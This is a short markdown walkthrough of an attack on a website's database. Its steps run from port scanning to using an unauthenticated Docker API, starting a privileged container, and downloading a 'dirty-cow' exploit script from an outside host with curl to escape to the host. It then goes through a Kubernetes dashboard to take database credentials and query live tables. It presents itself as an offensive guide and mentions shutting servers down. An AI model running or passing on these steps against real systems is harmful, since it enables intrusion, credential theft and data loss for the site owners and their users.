## Basic Attack - Attack the db of a website

- `ping <url>`
- Port scan to for penetration
```bash
zsh port-scan.sh <ip_addr_gotten_from_the_ping e.g 104.21.63.124>
```
- Let's assume a docker port is successful
- Assuming the docker does not have authentication or authorization, run:
`docker -H <url> ps`, to list the containers and `docker -H <url> version` for more information

- Let's see if we can penetrate a contiainer in 'privileged' mode, to access the underlying host:
```bash
docker -H <url> run --privileged -it ubuntu bash
```
- A vulnerability 'dirty-cow', has been spotted as a way into the host. Let's use it:
`curl http://catgirl.me/dirty-cow.sh > dirty-cow.sh 
  - 'command not found` reply
If there are no restrictions from installing binaries, let's install them:
`apt-get install curl`. nor rerun `curl http://catgirl.me/dirty-cow.sh > dirty-cow.sh ` to escape the container and enter the host with: `dirty-cow.sh`

- At this point, we can infilterate other networks and attack other systems as well
  - we can shut down servers and bring the entire application down

- If it is a kubernetes worker node, check with `hostname` and `sudo docker ps`, let's get the IPs from the ip-table `sudo iptables -L -t nat | grep <kubernetes-dashboard>`. Now we can publicly access the dashboard with `<node_IP:dashboard_port>`, if there are no restrictions placed on it also.

- On the dashboard in a browser, we found the environment variables and password to access the postgresql database

- Then we head back to the terminal to enter `sudo docker ps | grep db` and exec into it `docker exec -it <db_container> bash`

- Then we enter the variable to acces the database: `PGPASSWORD=xxx psql --username=postgres`

- Now in the database, lets's query the tables: `\dt` and select * from <live>
